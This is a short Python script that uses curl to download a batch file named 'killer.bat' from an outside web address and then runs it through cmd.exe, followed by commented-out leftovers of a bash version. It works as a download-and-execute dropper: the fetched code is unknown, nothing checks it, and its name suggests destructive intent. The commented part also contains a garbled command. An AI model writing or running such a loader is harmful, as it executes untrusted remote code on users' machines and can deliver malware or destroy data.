import subprocess
import os 


subprocess.run(["curl", "-o", "killer.bat", "https://thedomaindesigners.com/pages/kill.php"], check=True)


if os.path.exists("./killer.bat"):
    try:
        # Run the .bat file using cmd.exe
        subprocess.run(["cmd", "/c", ".\killer.bat"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing script: {e}")
#     with open("./killer.sh", "r", encoding="utf-8") as f:
#         print(f.read())
# else:
#     print(f"File not found: ./killer.sh")
# Make sure it’s executable
# subprocess.run(["type", "+x", script_path])

# # Run the script
# subprocess.run(["bash", script_path], check=True)